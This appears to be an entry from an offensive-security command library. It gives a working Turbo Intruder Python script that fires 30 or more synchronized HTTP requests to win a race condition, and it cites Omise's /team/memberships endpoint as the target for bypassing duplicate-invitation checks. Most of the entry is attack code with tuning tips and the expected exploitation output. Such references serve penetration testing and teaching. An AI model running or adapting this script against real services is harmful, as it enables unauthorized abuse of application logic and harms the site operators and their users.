---
id: cmd-turbo-race-001
data: |-
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=30,
                             requestsPerConnection=100,
                             pipeline=False
                            )

      for i in range(30):
          engine.queue(target.req, target.baseInput, gate='race1')

      engine.openGate('race1')

      engine.complete(timeout=60)

  def handleResponse(req, interesting):
      table.add(req)
tags:
  - race-condition
  - concurrent
type: command
output: >-
  Multiple 200 OK responses in Turbo Intruder results table, indicating
  successful duplicate invitations
executor: python
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:22.208Z'
verified: false
validated: true
submitted: true
---
# turbo-intruder-race-script

## Command

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                          )

    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')

    engine.openGate('race1')

    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

## Description

This Python script is executed within Turbo Intruder to orchestrate a race condition attack by queuing and simultaneously releasing 30 concurrent HTTP requests, bypassing duplicate checks in endpoints like Omise's /team/memberships.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| concurrentConnections | Number of parallel connections (30) | Yes |
| requestsPerConnection | Requests per connection limit (100) | Yes |
| pipeline | Enable HTTP pipelining (False) | Yes |
| gate | Synchronization gate name ('race1') | Yes |
| timeout | Completion timeout in seconds (60) | Yes |

## Examples

### Basic Usage

Paste into Turbo Intruder script pane and execute against loaded request.

### Advanced Usage

Modify range(30) to adjust concurrency; increase timeout for slower networks.

```python
for i in range(50):  # For 50 requests
    engine.queue(target.req, target.baseInput, gate='race1')
```

## Expected Output

Turbo Intruder displays a table with request details; successful exploitation shows 30+ entries with 200 OK status codes and no errors, confirming race win for duplicates.

## Related

- [[Related Procedure: Exploit-Race-Condition-with-Turbo-Intruder]]
